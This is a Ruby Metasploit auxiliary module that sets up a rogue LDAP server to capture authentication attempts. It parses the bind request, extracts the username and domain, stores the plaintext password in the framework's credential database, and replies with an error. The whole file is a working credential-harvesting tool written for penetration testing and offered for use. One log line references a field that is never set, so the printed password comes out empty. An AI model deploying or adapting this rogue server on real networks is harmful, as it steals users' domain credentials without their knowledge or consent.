##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'net/ldap'
require 'net/ldap/dn'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::LDAP::Server

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Authentication Capture: LDAP',
        'Description' => %q{
          This module mocks an LDAP service to capture authentication
          information of a client trying to authenticate against an LDAP service
        },
        'Author' => 'JustAnda7',
        'License' => MSF_LICENSE,
        'Action' => [
          [ 'Capture', { 'Description' => 'Run an LDAP capture server' } ]
        ],
        'PassiveActions' => [ 'Capture' ],
        'DefaultActions' => 'Capture',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptAddress.new('SRVHOST', [ true, 'The localhost to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', '389' ])
      ]
    )
  end

  def run
    exploit
  end

  def on_dispatch_request(client, data)
    return if data.strip.empty? || data.strip.nil?

    state = {}

    state[client] = {
      name: "#{client.peerhost}:#{client.peerport}",
      ip: client.peerhost,
      port: client.peerport
    }

    data.extend(Net::BER::Extensions::String)
    begin
      pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
      vprint_status("LDAP request data remaining: #{data}") unless data.empty?

      res = case pdu.app_tag
            when Net::LDAP::PDU::BindRequest
              domains = []
              names = []
              result_code = nil
              user_login = pdu.bind_parameters

              if !user_login.name.empty?
                if user_login.name =~ /@/
                  pub_info = user_login.name.split('@')
                  if pub_info.length <= 2
                    state[client][:user] = pub_info[0]
                    state[client][:domain] = pub_info[1]
                  else
                    result_code = Net::LDAP::ResultCodeInvalidCredentials
                    print_error("LDAP Login Attempt => From:#{state[client][:name]} DN:#{user_login.name}")
                  end
                elsif user_login.name =~ /,/
                  begin
                    dn = Net::LDAP::DN.new(user_login.name)
                    dn.each_pair do |key, value|
                      if key == 'cn'
                        names << value
                      elsif key == 'dc'
                        domains << value
                      end
                    end
                    state[client][:user] = names.first
                    state[client][:domain] = domains.empty? ? nil : domains.join('.')
                  rescue StandardError => e
                    print_error("LDAP Login Attempt => From:#{state[client][:name]} DN:#{user_login.name}")
                    raise e
                  end
                else
                  result_code = Net::LDAP::ResultCodeInvalidCredentials
                end
              else
                state[client][:user] = ''
                state[client][:domain] = nil
              end

              state[client][:pass] = user_login.authentication

              unless state[client][:user].empty? && state[client][:pass].empty?
                report_cred(
                  ip: state[client][:ip],
                  port: client.localport,
                  service_name: 'ldap',
                  user: state[client][:user],
                  password: state[client][:pass],
                  domain: state[client][:domain]
                )
              end
              print_good("LDAP Login Attempt => From:#{state[client][:name]} Username:#{state[client][:user]} Password:#{state[client][:password]}")
              result_code = Net::LDAP::ResultCodeAuthMethodNotSupported if result_code.nil?
              service.encode_ldap_response(
                pdu.message_id,
                result_code,
                '',
                Net::LDAP::ResultStrings[result_code],
                Net::LDAP::PDU::BindResult
              )
            else
              result_code = Net::LDAP::ResultCodeUnwillingToPerform
              service.encode_ldap_response(
                pdu.message_id,
                result_code,
                '',
                Net::LDAP::ResultStrings[result_code],
                Net::LDAP::PDU::SearchResult
              )
            end

      on_send_response(client, res) unless res.nil?
    rescue StandardError => e
      on_send_response(client,
                       service.encode_ldap_response(
                         1,
                         Net::LDAP::ResultCodeUnwillingToPerform,
                         '',
                         Net::LDAP::ResultStrings[result_code],
                         Net::LDAP::PDU::BindResult
                       ))
      print_error("Failed to handle LDAP request due to #{e}")
    end
  ensure
    client.close
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password,
      domain: opts[:domain],
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: opts[:domain]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
